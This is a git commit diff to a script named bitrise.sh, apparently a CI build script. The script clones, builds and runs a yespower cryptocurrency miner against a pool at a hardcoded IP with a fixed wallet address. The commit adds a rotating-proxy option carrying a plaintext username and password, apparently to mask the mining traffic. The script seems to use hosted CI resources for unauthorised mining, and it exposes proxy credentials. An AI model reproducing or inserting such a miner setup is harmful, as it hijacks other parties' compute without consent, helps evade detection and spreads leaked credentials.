9774096cf245c6ca654f3f4a682d49b2b6fb5fd2
oremine01 <oremine01@outlook.com>
2024-06-24 09:52:45 +0530

    Update bitrise.sh

--- bitrise.sh
+++ bitrise.sh
@@ -5,4 +5,4 @@ git clone https://github.com/whiveio/whive-cpuminer-mc-yespower.git
 cd whive-cpuminer-mc-yespower
  apt-get install build-essential libcurl4-openssl-dev -y
 ./build.sh
-./minerd -q -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -o stratum+tcp://206.189.2.17:3333 -a yespower
+./minerd -x xtncrobw-rotate:2xy2iaskqndm@p.webshare.io:80 -q -u wv1qe523ah5edaxwyk0q72ehcm9mghsd2hzajrcckt -o stratum+tcp://206.189.2.17:3333 -a yespower
